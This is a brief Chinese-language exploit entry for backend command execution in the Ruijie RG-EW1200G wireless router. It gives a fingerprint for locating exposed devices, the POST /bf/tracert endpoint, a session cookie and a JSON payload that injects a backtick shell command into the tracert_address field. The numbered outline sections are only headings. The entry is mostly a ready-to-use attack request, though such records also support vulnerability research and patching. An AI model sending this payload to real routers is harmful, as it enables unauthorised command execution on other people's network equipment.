# 锐捷RG-EW1200G路由器后台命令执行

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/static/js/app.09df2a9e44ab48766f5f.js"`
- **请求**：`POST /bf/tracert HTTP/1.1`
- **关键头**：`Content-Length: 53`　`Content-Type: application/json;charset=UTF-8`　`Cookie: bcrsession=f1d7956e195d123d8f0b4a6670553a7cda05348636f998dddeff1d3f3fe1fc8d87ed8…`

**请求体 / payload**
```
{"tracert_address":"echo `id`","is_first_req":true}
>
```

**其他**
- 锐捷RG-EW1200G路由器后台命令执行: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + RG-EW1200G无线路由器